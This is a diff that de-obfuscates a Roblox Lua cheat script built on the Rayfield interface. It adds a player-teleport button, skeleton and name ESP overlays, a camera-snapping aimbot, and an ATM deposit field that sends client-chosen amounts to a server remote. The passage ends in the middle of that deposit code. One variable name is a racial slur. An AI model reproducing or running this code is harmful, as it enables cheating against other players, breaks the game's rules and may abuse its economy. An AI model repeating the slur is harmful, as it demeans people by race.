+            table.insert(NewOptions, player.Name)
         end
     end
-    v056 = v059
-    v057:Set(v056)
+
+    dkIsANigger = NewOptions
+    TeleportDropdown:Set(dkIsANigger)
 end
-local v060 = v046:CreateButton({
+
+local TeleportButton = TeleportsTab:CreateButton({
     Name = "Teleport",
-    Callback = v012()
-        local v061 = v008:FindFirstChild(SelectedPlayer)
-        if v061 and v061.Character and v055.Character then
-            v055.Character:SetPrimaryPartCFrame(v061.Character:GetPrimaryPartCFrame())
+    Callback = function()
+        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+            LocalPlayer.Character:SetPrimaryPartCFrame(TargetPlayer.Character:GetPrimaryPartCFrame())
         end
     end,
 })
-local v062 = v005:CreateTab("Combat", 4483362458) 
-local v007 = v062:CreateSection("Esp's")
-local v024 = v062:CreateToggle({
+
+local CombatTab = Window:CreateTab("Combat", 4483362458) -- Title, Image
+local Section = CombatTab:CreateSection("Esp's")
+
+local Toggle = CombatTab:CreateToggle({
    Name = "Skeleton Esp",
    CurrentValue = false,
    Flag = "Toggle1",
-   Callback = v012(Value)
-        local v063 = game:GetService("v008").v055
-local v064 = v063:GetMouse()
-local v065 = game:GetService("Workspace").CurrentCamera
-local v012 DrawLine()
-    local v066 = Drawing.new("Line")
-    v066.Visible = false
-    v066.From = Vector2.new(0, 0)
-    v066.To = Vector2.new(1, 1)
-    v066.Color = Color3.fromRGB(255, 255, 0)
-    v066.Thickness = 1
-    v066.Transparency = 1
-    return v066
+   Callback = function(Value)
+        local Player = game:GetService("Players").LocalPlayer
+local Mouse = Player:GetMouse()
+local Camera = game:GetService("Workspace").CurrentCamera
+
+local function DrawLine()
+    local l = Drawing.new("Line")
+    l.Visible = false
+    l.From = Vector2.new(0, 0)
+    l.To = Vector2.new(1, 1)
+    l.Color = Color3.fromRGB(255, 255, 0)
+    l.Thickness = 1
+    l.Transparency = 1
+    return l
 end
-local v012 DrawESP(plr)
+
+local function DrawESP(plr)
     repeat wait() until plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil
-    local v067 = {}
-    local v068 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.v068) and true or false
-    if v068 then 
-        v067 = {
+    local limbs = {}
+    local R15 = (plr.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) and true or false
+    if R15 then 
+        limbs = {
+            -- Spine
             Head_UpperTorso = DrawLine(),
             UpperTorso_LowerTorso = DrawLine(),
+            -- Left Arm
             UpperTorso_LeftUpperArm = DrawLine(),
             LeftUpperArm_LeftLowerArm = DrawLine(),
             LeftLowerArm_LeftHand = DrawLine(),
+            -- Right Arm
             UpperTorso_RightUpperArm = DrawLine(),
             RightUpperArm_RightLowerArm = DrawLine(),
             RightLowerArm_RightHand = DrawLine(),
+            -- Left Leg
             LowerTorso_LeftUpperLeg = DrawLine(),
             LeftUpperLeg_LeftLowerLeg = DrawLine(),
             LeftLowerLeg_LeftFoot = DrawLine(),
+            -- Right Leg
             LowerTorso_RightUpperLeg = DrawLine(),
             RightUpperLeg_RightLowerLeg = DrawLine(),
             RightLowerLeg_RightFoot = DrawLine(),
         }
     else 
-        v067 = {
+        limbs = {
             Head_Spine = DrawLine(),
             Spine = DrawLine(),
             LeftArm = DrawLine(),
@@ -633,371 +737,472 @@ local v012 DrawESP(plr)
             RightLeg_LowerTorso = DrawLine()
         }
     end
-    local v012 Visibility(state)
-        for i, v in pairs(v067) do
+    local function Visibility(state)
+        for i, v in pairs(limbs) do
             v.Visible = state
         end
     end
-    local v012 Colorize(color)
-        for i, v in pairs(v067) do
+
+    local function Colorize(color)
+        for i, v in pairs(limbs) do
             v.Color = color
         end
     end
-    local v012 UpdaterR15()
-        local v069
-        v069 = game:GetService("v094").RenderStepped:Connect(v012()
+
+    local function UpdaterR15()
+        local connection
+        connection = game:GetService("RunService").RenderStepped:Connect(function()
             if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
-                local v070, vis = v065:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                 if vis then
-                    local v071 = v065:WorldToViewportPoint(plr.Character.Head.Position)
-                    if v067.Head_UpperTorso.From ~= Vector2.new(v071.X, v071.Y) then
-                        local v072 = v065:WorldToViewportPoint(plr.Character.UpperTorso.Position)
-                        local v073 = v065:WorldToViewportPoint(plr.Character.LowerTorso.Position)
-                        local v074 = v065:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
-                        local v075 = v065:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
-                        local v076 = v065:WorldToViewportPoint(plr.Character.LeftHand.Position)
-                        local v077 = v065:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
-                        local v078 = v065:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
-                        local v079 = v065:WorldToViewportPoint(plr.Character.RightHand.Position)
-                        local v080 = v065:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
-                        local v081 = v065:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
-                        local v082 = v065:WorldToViewportPoint(plr.Character.LeftFoot.Position)
-                        local v083 = v065:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
-                        local v084 = v065:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
-                        local v085 = v065:WorldToViewportPoint(plr.Character.RightFoot.Position)
-                        v067.Head_UpperTorso.From = Vector2.new(v071.X, v071.Y)
-                        v067.Head_UpperTorso.To = Vector2.new(v072.X, v072.Y)
-                        v067.UpperTorso_LowerTorso.From = Vector2.new(v072.X, v072.Y)
-                        v067.UpperTorso_LowerTorso.To = Vector2.new(v073.X, v073.Y)
-                        v067.UpperTorso_LeftUpperArm.From = Vector2.new(v072.X, v072.Y)
-                        v067.UpperTorso_LeftUpperArm.To = Vector2.new(v074.X, v074.Y)
-                        v067.LeftUpperArm_LeftLowerArm.From = Vector2.new(v074.X, v074.Y)
-                        v067.LeftUpperArm_LeftLowerArm.To = Vector2.new(v075.X, v075.Y)
-                        v067.LeftLowerArm_LeftHand.From = Vector2.new(v075.X, v075.Y)
-                        v067.LeftLowerArm_LeftHand.To = Vector2.new(v076.X, v076.Y)
-                        v067.UpperTorso_RightUpperArm.From = Vector2.new(v072.X, v072.Y)
-                        v067.UpperTorso_RightUpperArm.To = Vector2.new(v077.X, v077.Y)
-                        v067.RightUpperArm_RightLowerArm.From = Vector2.new(v077.X, v077.Y)
-                        v067.RightUpperArm_RightLowerArm.To = Vector2.new(v078.X, v078.Y)
-                        v067.RightLowerArm_RightHand.From = Vector2.new(v078.X, v078.Y)
-                        v067.RightLowerArm_RightHand.To = Vector2.new(v079.X, v079.Y)
-                        v067.LowerTorso_LeftUpperLeg.From = Vector2.new(v073.X, v073.Y)
-                        v067.LowerTorso_LeftUpperLeg.To = Vector2.new(v080.X, v080.Y)
-                        v067.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(v080.X, v080.Y)
-                        v067.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(v081.X, v081.Y)
-                        v067.LeftLowerLeg_LeftFoot.From = Vector2.new(v081.X, v081.Y)
-                        v067.LeftLowerLeg_LeftFoot.To = Vector2.new(v082.X, v082.Y)
-                        v067.LowerTorso_RightUpperLeg.From = Vector2.new(v073.X, v073.Y)
-                        v067.LowerTorso_RightUpperLeg.To = Vector2.new(v083.X, v083.Y)
-                        v067.RightUpperLeg_RightLowerLeg.From = Vector2.new(v083.X, v083.Y)
-                        v067.RightUpperLeg_RightLowerLeg.To = Vector2.new(v084.X, v084.Y)
-                        v067.RightLowerLeg_RightFoot.From = Vector2.new(v084.X, v084.Y)
-                        v067.RightLowerLeg_RightFoot.To = Vector2.new(v085.X, v085.Y)
+                    -- Head
+                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
+                    if limbs.Head_UpperTorso.From ~= Vector2.new(H.X, H.Y) then
+                        --Spine
+                        local UT = Camera:WorldToViewportPoint(plr.Character.UpperTorso.Position)
+                        local LT = Camera:WorldToViewportPoint(plr.Character.LowerTorso.Position)
+                        -- Left Arm
+                        local LUA = Camera:WorldToViewportPoint(plr.Character.LeftUpperArm.Position)
+                        local LLA = Camera:WorldToViewportPoint(plr.Character.LeftLowerArm.Position)
+                        local LH = Camera:WorldToViewportPoint(plr.Character.LeftHand.Position)
+                        -- Right Arm
+                        local RUA = Camera:WorldToViewportPoint(plr.Character.RightUpperArm.Position)
+                        local RLA = Camera:WorldToViewportPoint(plr.Character.RightLowerArm.Position)
+                        local RH = Camera:WorldToViewportPoint(plr.Character.RightHand.Position)
+                        -- Left leg
+                        local LUL = Camera:WorldToViewportPoint(plr.Character.LeftUpperLeg.Position)
+                        local LLL = Camera:WorldToViewportPoint(plr.Character.LeftLowerLeg.Position)
+                        local LF = Camera:WorldToViewportPoint(plr.Character.LeftFoot.Position)
+                        -- Right leg
+                        local RUL = Camera:WorldToViewportPoint(plr.Character.RightUpperLeg.Position)
+                        local RLL = Camera:WorldToViewportPoint(plr.Character.RightLowerLeg.Position)
+                        local RF = Camera:WorldToViewportPoint(plr.Character.RightFoot.Position)
+
+                        --Head
+                        limbs.Head_UpperTorso.From = Vector2.new(H.X, H.Y)
+                        limbs.Head_UpperTorso.To = Vector2.new(UT.X, UT.Y)
+
+                        --Spine
+                        limbs.UpperTorso_LowerTorso.From = Vector2.new(UT.X, UT.Y)
+                        limbs.UpperTorso_LowerTorso.To = Vector2.new(LT.X, LT.Y)
+
+                        -- Left Arm
+                        limbs.UpperTorso_LeftUpperArm.From = Vector2.new(UT.X, UT.Y)
+                        limbs.UpperTorso_LeftUpperArm.To = Vector2.new(LUA.X, LUA.Y)
+
+                        limbs.LeftUpperArm_LeftLowerArm.From = Vector2.new(LUA.X, LUA.Y)
+                        limbs.LeftUpperArm_LeftLowerArm.To = Vector2.new(LLA.X, LLA.Y)
+
+                        limbs.LeftLowerArm_LeftHand.From = Vector2.new(LLA.X, LLA.Y)
+                        limbs.LeftLowerArm_LeftHand.To = Vector2.new(LH.X, LH.Y)
+
+                        -- Right Arm
+                        limbs.UpperTorso_RightUpperArm.From = Vector2.new(UT.X, UT.Y)
+                        limbs.UpperTorso_RightUpperArm.To = Vector2.new(RUA.X, RUA.Y)
+
+                        limbs.RightUpperArm_RightLowerArm.From = Vector2.new(RUA.X, RUA.Y)
+                        limbs.RightUpperArm_RightLowerArm.To = Vector2.new(RLA.X, RLA.Y)
+
+                        limbs.RightLowerArm_RightHand.From = Vector2.new(RLA.X, RLA.Y)
+                        limbs.RightLowerArm_RightHand.To = Vector2.new(RH.X, RH.Y)
+
+                        -- Left Leg
+                        limbs.LowerTorso_LeftUpperLeg.From = Vector2.new(LT.X, LT.Y)
+                        limbs.LowerTorso_LeftUpperLeg.To = Vector2.new(LUL.X, LUL.Y)
+
+                        limbs.LeftUpperLeg_LeftLowerLeg.From = Vector2.new(LUL.X, LUL.Y)
+                        limbs.LeftUpperLeg_LeftLowerLeg.To = Vector2.new(LLL.X, LLL.Y)
+
+                        limbs.LeftLowerLeg_LeftFoot.From = Vector2.new(LLL.X, LLL.Y)
+                        limbs.LeftLowerLeg_LeftFoot.To = Vector2.new(LF.X, LF.Y)
+
+                        -- Right Leg
+                        limbs.LowerTorso_RightUpperLeg.From = Vector2.new(LT.X, LT.Y)
+                        limbs.LowerTorso_RightUpperLeg.To = Vector2.new(RUL.X, RUL.Y)
+
+                        limbs.RightUpperLeg_RightLowerLeg.From = Vector2.new(RUL.X, RUL.Y)
+                        limbs.RightUpperLeg_RightLowerLeg.To = Vector2.new(RLL.X, RLL.Y)
+
+                        limbs.RightLowerLeg_RightFoot.From = Vector2.new(RLL.X, RLL.Y)
+                        limbs.RightLowerLeg_RightFoot.To = Vector2.new(RF.X, RF.Y)
                     end
-                    if v067.Head_UpperTorso.Visible ~= true then
+
+                    if limbs.Head_UpperTorso.Visible ~= true then
                         Visibility(true)
                     end
                 else 
-                    if v067.Head_UpperTorso.Visible ~= false then
+                    if limbs.Head_UpperTorso.Visible ~= false then
                         Visibility(false)
                     end
                 end
             else 
-                if v067.Head_UpperTorso.Visible ~= false then
+                if limbs.Head_UpperTorso.Visible ~= false then
                     Visibility(false)
                 end
-                if game.v008:FindFirstChild(plr.Name) == nil then 
-                    for i, v in pairs(v067) do
+                if game.Players:FindFirstChild(plr.Name) == nil then 
+                    for i, v in pairs(limbs) do
                         v:Remove()
                     end
-                    v069:Disconnect()
+                    connection:Disconnect()
                 end
             end
         end)
     end
-    local v012 UpdaterR6()
-        local v069
-        v069 = game:GetService("v094").RenderStepped:Connect(v012()
+
+    local function UpdaterR6()
+        local connection
+        connection = game:GetService("RunService").RenderStepped:Connect(function()
             if plr.Character ~= nil and plr.Character:FindFirstChild("Humanoid") ~= nil and plr.Character:FindFirstChild("HumanoidRootPart") ~= nil and plr.Character.Humanoid.Health > 0 then
-                local v070, vis = v065:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
+                local HUM, vis = Camera:WorldToViewportPoint(plr.Character.HumanoidRootPart.Position)
                 if vis then
-                    local v071 = v065:WorldToViewportPoint(plr.Character.Head.Position)
-                    if v067.Head_Spine.From ~= Vector2.new(v071.X, v071.Y) then
-                        local v086 = plr.Character.Torso.Size.Y/2 - 0.2
-                        local v072 = v065:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, v086, 0)).p)
-                        local v073 = v065:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -v086, 0)).p)
-                        local v087 = plr.Character["Left Arm"].Size.Y/2 - 0.2
-                        local v074 = v065:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, v087, 0)).p)
-                        local v075 = v065:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -v087, 0)).p)
-                        local v088 = plr.Character["Right Arm"].Size.Y/2 - 0.2
-                        local v077 = v065:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, v088, 0)).p)
-                        local v078 = v065:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -v088, 0)).p)
-                        local v089 = plr.Character["Left Leg"].Size.Y/2 - 0.2
-                        local v080 = v065:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, v089, 0)).p)
-                        local v081 = v065:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -v089, 0)).p)
-                        local v090 = plr.Character["Right Leg"].Size.Y/2 - 0.2
-                        local v083 = v065:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, v090, 0)).p)
-                        local v084 = v065:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -v090, 0)).p)
-                        v067.Head_Spine.From = Vector2.new(v071.X, v071.Y)
-                        v067.Head_Spine.To = Vector2.new(v072.X, v072.Y)
-                        v067.Spine.From = Vector2.new(v072.X, v072.Y)
-                        v067.Spine.To = Vector2.new(v073.X, v073.Y)
-                        v067.LeftArm.From = Vector2.new(v074.X, v074.Y)
-                        v067.LeftArm.To = Vector2.new(v075.X, v075.Y)
-                        v067.LeftArm_UpperTorso.From = Vector2.new(v072.X, v072.Y)
-                        v067.LeftArm_UpperTorso.To = Vector2.new(v074.X, v074.Y)
-                        v067.RightArm.From = Vector2.new(v077.X, v077.Y)
-                        v067.RightArm.To = Vector2.new(v078.X, v078.Y)
-                        v067.RightArm_UpperTorso.From = Vector2.new(v072.X, v072.Y)
-                        v067.RightArm_UpperTorso.To = Vector2.new(v077.X, v077.Y)
-                        v067.LeftLeg.From = Vector2.new(v080.X, v080.Y)
-                        v067.LeftLeg.To = Vector2.new(v081.X, v081.Y)
-                        v067.LeftLeg_LowerTorso.From = Vector2.new(v073.X, v073.Y)
-                        v067.LeftLeg_LowerTorso.To = Vector2.new(v080.X, v080.Y)
-                        v067.RightLeg.From = Vector2.new(v083.X, v083.Y)
-                        v067.RightLeg.To = Vector2.new(v084.X, v084.Y)
-                        v067.RightLeg_LowerTorso.From = Vector2.new(v073.X, v073.Y)
-                        v067.RightLeg_LowerTorso.To = Vector2.new(v083.X, v083.Y)
+                    local H = Camera:WorldToViewportPoint(plr.Character.Head.Position)
+                    if limbs.Head_Spine.From ~= Vector2.new(H.X, H.Y) then
+                        local T_Height = plr.Character.Torso.Size.Y/2 - 0.2
+                        local UT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, T_Height, 0)).p)
+                        local LT = Camera:WorldToViewportPoint((plr.Character.Torso.CFrame * CFrame.new(0, -T_Height, 0)).p)
+
+                        local LA_Height = plr.Character["Left Arm"].Size.Y/2 - 0.2
+                        local LUA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, LA_Height, 0)).p)
+                        local LLA = Camera:WorldToViewportPoint((plr.Character["Left Arm"].CFrame * CFrame.new(0, -LA_Height, 0)).p)
+
+                        local RA_Height = plr.Character["Right Arm"].Size.Y/2 - 0.2
+                        local RUA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, RA_Height, 0)).p)
+                        local RLA = Camera:WorldToViewportPoint((plr.Character["Right Arm"].CFrame * CFrame.new(0, -RA_Height, 0)).p)
+
+                        local LL_Height = plr.Character["Left Leg"].Size.Y/2 - 0.2
+                        local LUL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, LL_Height, 0)).p)
+                        local LLL = Camera:WorldToViewportPoint((plr.Character["Left Leg"].CFrame * CFrame.new(0, -LL_Height, 0)).p)
+
+                        local RL_Height = plr.Character["Right Leg"].Size.Y/2 - 0.2
+                        local RUL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, RL_Height, 0)).p)
+                        local RLL = Camera:WorldToViewportPoint((plr.Character["Right Leg"].CFrame * CFrame.new(0, -RL_Height, 0)).p)
+
+                        -- Head
+                        limbs.Head_Spine.From = Vector2.new(H.X, H.Y)
+                        limbs.Head_Spine.To = Vector2.new(UT.X, UT.Y)
+
+                        --Spine
+                        limbs.Spine.From = Vector2.new(UT.X, UT.Y)
+                        limbs.Spine.To = Vector2.new(LT.X, LT.Y)
+
+                        --Left Arm
+                        limbs.LeftArm.From = Vector2.new(LUA.X, LUA.Y)
+                        limbs.LeftArm.To = Vector2.new(LLA.X, LLA.Y)
+
+                        limbs.LeftArm_UpperTorso.From = Vector2.new(UT.X, UT.Y)
+                        limbs.LeftArm_UpperTorso.To = Vector2.new(LUA.X, LUA.Y)
+
+                        --Right Arm
+                        limbs.RightArm.From = Vector2.new(RUA.X, RUA.Y)
+                        limbs.RightArm.To = Vector2.new(RLA.X, RLA.Y)
+
+                        limbs.RightArm_UpperTorso.From = Vector2.new(UT.X, UT.Y)
+                        limbs.RightArm_UpperTorso.To = Vector2.new(RUA.X, RUA.Y)
+
+                        --Left Leg
+                        limbs.LeftLeg.From = Vector2.new(LUL.X, LUL.Y)
+                        limbs.LeftLeg.To = Vector2.new(LLL.X, LLL.Y)
+
+                        limbs.LeftLeg_LowerTorso.From = Vector2.new(LT.X, LT.Y)
+                        limbs.LeftLeg_LowerTorso.To = Vector2.new(LUL.X, LUL.Y)
+
+                        --Right Leg
+                        limbs.RightLeg.From = Vector2.new(RUL.X, RUL.Y)
+                        limbs.RightLeg.To = Vector2.new(RLL.X, RLL.Y)
+
+                        limbs.RightLeg_LowerTorso.From = Vector2.new(LT.X, LT.Y)
+                        limbs.RightLeg_LowerTorso.To = Vector2.new(RUL.X, RUL.Y)
                     end
-                    if v067.Head_Spine.Visible ~= true then
+
+                    if limbs.Head_Spine.Visible ~= true then
                         Visibility(true)
                     end
                 else 
-                    if v067.Head_Spine.Visible ~= false then
+                    if limbs.Head_Spine.Visible ~= false then
                         Visibility(false)
                     end
                 end
             else 
-                if v067.Head_Spine.Visible ~= false then
+                if limbs.Head_Spine.Visible ~= false then
                     Visibility(false)
                 end
-                if game.v008:FindFirstChild(plr.Name) == nil then 
-                    for i, v in pairs(v067) do
+                if game.Players:FindFirstChild(plr.Name) == nil then 
+                    for i, v in pairs(limbs) do
                         v:Remove()
                     end
-                    v069:Disconnect()
+                    connection:Disconnect()
                 end
             end
         end)
     end
-    if v068 then
+
+    if R15 then
         coroutine.wrap(UpdaterR15)()
     else 
         coroutine.wrap(UpdaterR6)()
     end
 end
-for i, v in pairs(game:GetService("v008"):GetPlayers()) do
-    if v.Name ~= v063.Name then
+
+for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+    if v.Name ~= Player.Name then
         DrawESP(v)
     end
 end
-game.v008.PlayerAdded:Connect(v012(newplr)
-    if newplr.Name ~= v063.Name then
+
+game.Players.PlayerAdded:Connect(function(newplr)
+    if newplr.Name ~= Player.Name then
         DrawESP(newplr)
     end
 end)
         end 
     })
-local v024 = v062:CreateToggle({
+
+local Toggle = CombatTab:CreateToggle({
    Name = "Name Esp",
    CurrentValue = false,
-   Flag = "Toggle1", 
-   Callback = v012(Value)
-        local v091 = {
+   Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Value)
+        local esp_settings = {
     textsize = 8,
     colour = 167,200,100
 }
-local v092 = Instance.new("BillboardGui")
-local v093 = Instance.new("TextLabel",v092) 
-v092.Name = "ESP Sht"; 
-v092.ResetOnSpawn = false
-v092.AlwaysOnTop = true;
-v092.LightInfluence = 0;
-v092.Size = UDim2.new(1.75, 0, 1.75, 0);
-v093.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
-v093.Text = ""
-v093.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
-v093.BorderSizePixel = 4;
-v093.BorderColor3 = Color3.new(v091.colour)
-v093.BorderSizePixel = 0
-v093.Font = "GothamSemibold"
-v093.TextSize = v091.textsize
-v093.TextColor3 = Color3.fromRGB(v091.colour)
-game:GetService("v094").RenderStepped:Connect(v012()
-    for i,v in pairs (game:GetService("v008"):GetPlayers()) do
-        if v ~= game:GetService("v008").v055 and v.Character.Head:FindFirstChild("Esp Sht")==nil  then 
-            v093.Text = "{"..v.Name.."}"
-            v092:Clone().Parent = v.Character.Head
+ 
+local gui = Instance.new("BillboardGui")
+local esp = Instance.new("TextLabel",gui) 
+ 
+ 
+gui.Name = "ESP Sht"; 
+gui.ResetOnSpawn = false
+gui.AlwaysOnTop = true;
+gui.LightInfluence = 0;
+gui.Size = UDim2.new(1.75, 0, 1.75, 0);
+esp.BackgroundColor3 = Color3.fromRGB(255, 255, 255);
+esp.Text = ""
+esp.Size = UDim2.new(0.0001, 0.00001, 0.0001, 0.00001);
+esp.BorderSizePixel = 4;
+esp.BorderColor3 = Color3.new(esp_settings.colour)
+esp.BorderSizePixel = 0
+esp.Font = "GothamSemibold"
+esp.TextSize = esp_settings.textsize
+esp.TextColor3 = Color3.fromRGB(esp_settings.colour)
+ 
+ 
+ 
+game:GetService("RunService").RenderStepped:Connect(function()
+    for i,v in pairs (game:GetService("Players"):GetPlayers()) do
+        if v ~= game:GetService("Players").LocalPlayer and v.Character.Head:FindFirstChild("Esp Sht")==nil  then 
+            esp.Text = "{"..v.Name.."}"
+            gui:Clone().Parent = v.Character.Head
         end
     end
 end)     
    end,
 })
-local v007 = v062:CreateSection("Extra Combat Hacks")
-local v008 = game:GetService("v008")
-local v094 = game:GetService("v094")
-local v095 = game:GetService("v095")
-local v096 = v008.v055
-local v097 = v096:GetMouse()
-local v098 = workspace.CurrentCamera
+
+local Section = CombatTab:CreateSection("Extra Combat Hacks")
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local localPlayer = Players.LocalPlayer
+local mouse = localPlayer:GetMouse()
+local camera = workspace.CurrentCamera
+
 _G.aimbotSystemEnabled = false
-local v099 = 100
-local v100 = false
-local v101 = Color3.new(1, 1, 0) 
-local v102 = nil
-local v012 createAimCircle()
-    if not v102 then
-        v102 = Drawing.new("Circle")
-        v102.Visible = false
-        v102.Color = v101
-        v102.Thickness = 2
-        v102.Radius = v099
-        v102.Filled = false
+
+local aimCircleRadius = 100
+local aimbotEnabled = false
+local circleColor = Color3.new(1, 1, 0) -- Yellow
+
+local aimCircle = nil
+
+-- Create visual aim circle
+local function createAimCircle()
+    if not aimCircle then
+        aimCircle = Drawing.new("Circle")
+        aimCircle.Visible = false
+        aimCircle.Color = circleColor
+        aimCircle.Thickness = 2
+        aimCircle.Radius = aimCircleRadius
+        aimCircle.Filled = false
     end
 end
-local v012 destroyAimCircle()
-    if v102 then
-        v102:Remove()
-        v102 = nil
+
+-- Remove the aim circle
+local function destroyAimCircle()
+    if aimCircle then
+        aimCircle:Remove()
+        aimCircle = nil
     end
 end
-local v012 isPlayerInAimCircle(v002)
-    local v103 = v002.Character
-    if v103 and v103:FindFirstChild("HumanoidRootPart") then
-        local v104 = v103.HumanoidRootPart
-        local v105, onScreen = v098:WorldToScreenPoint(v104.Position)
+
+-- Check if a player is inside the aim circle
+local function isPlayerInAimCircle(player)
+    local character = player.Character
+    if character and character:FindFirstChild("HumanoidRootPart") then
+        local rootPart = character.HumanoidRootPart
+        local screenPos, onScreen = camera:WorldToScreenPoint(rootPart.Position)
         if onScreen then
-            local v106 = Vector2.new(v097.X, v097.Y)
-            local v107 = (v106 - Vector2.new(v105.X, v105.Y)).Magnitude
-            return v107 <= v099, v107
+            local mousePos = Vector2.new(mouse.X, mouse.Y)
+            local distFromMouse = (mousePos - Vector2.new(screenPos.X, screenPos.Y)).Magnitude
+            return distFromMouse <= aimCircleRadius, distFromMouse
         end
     end
     return false, math.huge
 end
-local v012 getClosestPlayer()
-    local v108 = nil
-    local v109 = v099
-    for _, v002 in pairs(v008:GetPlayers()) do
-        if v002 ~= v096 then
-            local v103 = v002.Character
-            if v103 and v103:FindFirstChild("Humanoid") and v103.Humanoid.Health > 0 then
-                local v110, distance = isPlayerInAimCircle(v002)
-                if v110 and distance < v109 then
-                    v109 = distance
-                    v108 = v002
+
+-- Find the closest player to aim at
+local function getClosestPlayer()
+    local closestPlayer = nil
+    local closestDistance = aimCircleRadius
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer then
+            local character = player.Character
+            if character and character:FindFirstChild("Humanoid") and character.Humanoid.Health > 0 then
+                local inCircle, distance = isPlayerInAimCircle(player)
+                if inCircle and distance < closestDistance then
+                    closestDistance = distance
+                    closestPlayer = player
                 end
             end
         end
     end
-    return v108
+
+    return closestPlayer
 end
-local v012 aimAtTarget(v002)
-    local v103 = v002.Character
-    if v103 and v103:FindFirstChild("HumanoidRootPart") and v103:FindFirstChild("Head") then
-        local v111 = v103.Head
-        v098.CFrame = CFrame.new(v098.CFrame.Position, v111.Position)
+
+-- Snap the camera to the target
+local function aimAtTarget(player)
+    local character = player.Character
+    if character and character:FindFirstChild("HumanoidRootPart") and character:FindFirstChild("Head") then
+        local head = character.Head
+        camera.CFrame = CFrame.new(camera.CFrame.Position, head.Position)
     end
 end
-v095.InputBegan:Connect(v012(input)
+
+-- Input controls for right mouse button
+UserInputService.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton2 and _G.aimbotSystemEnabled then
-        v100 = true
+        aimbotEnabled = true
     end
 end)
-v095.InputEnded:Connect(v012(input)
+
+UserInputService.InputEnded:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton2 then
-        v100 = false
+        aimbotEnabled = false
     end
 end)
-v094.RenderStepped:Connect(v012()
+
+-- Render loop for tracking + drawing
+RunService.RenderStepped:Connect(function()
     if not _G.aimbotSystemEnabled then
         destroyAimCircle()
         return
     end
-    if not v102 then
+
+    if not aimCircle then
         createAimCircle()
     end
-    v102.Position = Vector2.new(v097.X, v097.Y + 40)
-    v102.Visible = true
-    if v100 then
-        local v108 = getClosestPlayer()
-        if v108 then
-            aimAtTarget(v108)
+
+    aimCircle.Position = Vector2.new(mouse.X, mouse.Y + 40)
+    aimCircle.Visible = true
+
+    if aimbotEnabled then
+        local closestPlayer = getClosestPlayer()
+        if closestPlayer then
+            aimAtTarget(closestPlayer)
         end
     end
 end)
-local v024 = v062:CreateToggle({
+
+-- GUI toggle for enabling/disabling aimbot
+local Toggle = CombatTab:CreateToggle({
     Name = "Aimbot",
     CurrentValue = false,
     Flag = "Aimbot",
-    Callback = v012(Value)
+    Callback = function(Value)
         _G.aimbotSystemEnabled = Value
         if not _G.aimbotSystemEnabled then
             destroyAimCircle()
         end
     end
 })
-v006:CreateSection("Atm")
-local v112 = 2000000
-v006:CreateInput({
+
+
+MainTab:CreateSection("Atm")
+
+        -- Starting balance — set this to your current bank amount
+local bankBalance = 2000000
+
+-- Deposit input
+MainTab:CreateInput({
     Name = "Deposit",
-    PlaceholderText = "Enter v113 to deposit",
+    PlaceholderText = "Enter amount to deposit",
     RemoveTextAfterFocusLost = true,
-    Callback = v012(input)
-        local v113 = tonumber(input)
-        if v113 then
-            v112 = v112 + v113
-            game:GetService("v009"):WaitForChild("ATMRF"):InvokeServer("deposit", v113)
-            v001:Notify({
+    Callback = function(input)
+        local amount = tonumber(input)
+        if amount then
+            bankBalance = bankBalance + amount
+            game:GetService("ReplicatedStorage"):WaitForChild("ATMRF"):InvokeServer("deposit", amount)
+
+            Rayfield:Notify({
                 Title = "Deposit Complete",
-                Content = "Deposited $" .. v113 .. "\nNew Balance: $" .. v112,
+                Content = "Deposited $" .. amount .. "\nNew Balance: $" .. bankBalance,
                 Duration = 5
             })
         else
-            v001:Notify({
+            Rayfield:Notify({
